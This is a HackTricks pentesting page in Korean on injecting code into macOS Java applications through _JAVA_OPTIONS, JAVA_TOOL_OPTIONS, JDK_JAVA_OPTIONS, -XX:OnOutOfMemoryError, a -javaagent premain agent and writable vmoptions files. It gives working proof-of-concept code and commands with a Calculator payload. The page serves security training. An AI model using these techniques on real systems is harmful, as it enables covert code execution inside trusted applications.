# macOS Java Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## 열거

시스템에 설치된 Java applications를 찾습니다. **Info.plist**의 Java apps에는 **`java.`** 문자열을 포함하는 일부 Java parameters가 있는 것으로 확인되었으므로, 이를 검색할 수 있습니다:
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA_OPTIONS

환경 변수 **`_JAVA_OPTIONS`**는 Java application이 시작될 때 임의의 Java VM parameters를 inject하는 데 사용할 수 있습니다.<sup>[[1]](#references)</sup>

Java launch stack은 서로 다른 scope를 가진, 더 명확하게 정의된 두 가지 variable도 인식합니다:

- `JAVA_TOOL_OPTIONS`는 VM이 생성될 때 읽히며, `java` launcher를 거치지 않는 일부 embedded launch path도 포함합니다. `-javaagent`, `-agentlib` 또는 `-agentpath`와 같은 instrumentation options를 inject할 수 있습니다.<sup>[[4]](#references)</sup>
- `JDK_JAVA_OPTIONS`는 `java` launcher에 의해 command line 앞에 추가됩니다. main class를 선택하거나 launcher를 종료하는 options는 금지되지만, `-javaagent`는 허용됩니다.<sup>[[5]](#references)</sup>

공격자가 호환되는 readable agent도 제공할 수 있는 경우, 세 variable 모두 JVM code-execution controls로 취급해야 합니다. `_JAVA_OPTIONS`는 HotSpot implementation detail이므로 정확한 vendor와 version을 기준으로 검증해야 합니다. 이식 가능한 테스트에는 `JAVA_TOOL_OPTIONS` 또는 `JDK_JAVA_OPTIONS`가 더 적합합니다.
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
현재 터미널의 자식 프로세스가 아닌 새 프로세스로 실행하려면 다음을 사용할 수 있습니다:
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
그러나 해당 technique은 실행된 애플리케이션에서 오류를 발생시킵니다. 더 은밀한 대안은 Java agent를 생성하고 `-javaagent`를 사용하는 것입니다.<sup>[[2]](#references)</sup>
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"

# The same agent with the standardized VM initialization variable:
JAVA_TOOL_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar

# Or through the JDK java launcher:
JDK_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar
```
> [!CAUTION]
> 애플리케이션과 **다른 Java 버전**으로 agent를 생성하면 agent와 애플리케이션이 모두 crash될 수 있습니다.

agent가 존재할 수 있는 위치는 다음과 같습니다:
```java:Agent.java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
에이전트를 컴파일하려면 다음을 실행합니다:
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
`manifest.txt` 사용 시:
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
그런 다음 환경 변수를 export하고 Java 애플리케이션을 다음과 같이 실행합니다:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## vmoptions 파일

이 파일은 Java가 실행될 때 **Java parameters**를 지정할 수 있도록 지원합니다. 앞서 설명한 일부 기법을 사용해 Java parameters를 변경하고 **프로세스가 임의의 명령을 실행하도록 만들 수 있습니다**.\
또한 이 파일은 `include` 지시어를 사용해 **다른 파일을 포함**할 수도 있으므로, 포함된 파일도 변경할 수 있습니다.

더 나아가 일부 Java 앱은 **둘 이상의 `vmoptions`** 파일을 **로드합니다**.

Android Studio와 같은 일부 애플리케이션은 이러한 파일을 **찾는 위치를 출력에 표시합니다**:<sup>[[3]](#references)</sup>
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
그렇지 않다면 다음과 같이 확인할 수 있습니다:
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
Android Studio가 이 예시에서 **`/Applications/Android Studio.app.vmoptions`**를 로드하려고 한다는 점에 주목하세요. 이 위치에는 **`admin` 그룹의 모든 사용자가 쓰기 권한을 가지고 있습니다**.

## References

- [1] [OpenJDK — `arguments.cpp`의 `_JAVA_OPTIONS` 파싱](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
- [2] [Oracle Java — `java.lang.instrument` 패키지 사양](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
- [3] [JetBrains — JVM 옵션 및 platform properties 구성](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
- [4] [Oracle Java — `JAVA_TOOL_OPTIONS`](https://docs.oracle.com/javase/8/docs/technotes/guides/troubleshoot/envvars002.html)
- [5] [`java` launcher — `JDK_JAVA_OPTIONS`](https://docs.oracle.com/en/java/javase/25/docs/specs/man/java.html#using-the-jdk_java_options-launcher-environment-variable)
{{#include ../../../banners/hacktricks-training.md}}
